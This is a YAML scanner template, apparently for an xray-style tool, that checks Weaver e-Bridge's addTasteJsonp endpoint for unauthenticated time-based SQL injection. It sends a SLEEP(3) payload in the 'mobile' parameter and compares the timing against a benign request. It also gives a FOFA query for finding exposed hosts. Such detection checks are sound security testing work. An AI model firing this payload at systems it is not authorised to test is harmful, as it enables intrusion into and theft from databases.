id: weaver-ebridge-addTasteJsonp-sqli
info:
  name: Weaver e-Bridge addTasteJsonp SQL Injection
  author: ZacharyZcR
  severity: high
  description: |
    Weaver e-Bridge system addTasteJsonp interface exists SQL injection vulnerability.
    Unauthenticated attackers can exploit SQL injection vulnerabilities to obtain information in the database.
    FOFA: app="泛微云桥e-Bridge"
  reference:
    - https://mp.weixin.qq.com/s/Ej26hywx4po4sj3dSAVI_Q

rules:
  r0:
    request:
      method: GET
      path: /taste/addTasteJsonp
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
      params:
        company: "1"
        userName: "1"
        jsonpcallback: "1"
        mobile: "1%27+AND+%28SELECT+SLEEP%283%29%29%23"
    expression: response.status == 200 && response.elapsed.seconds() >= 3

  r1:
    request:
      method: GET
      path: /taste/addTasteJsonp
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
      params:
        company: "1"
        userName: "1"
        jsonpcallback: "1"
        mobile: "1"
    expression: response.status == 200 && response.elapsed.seconds() < 2

expression: r0() && r1()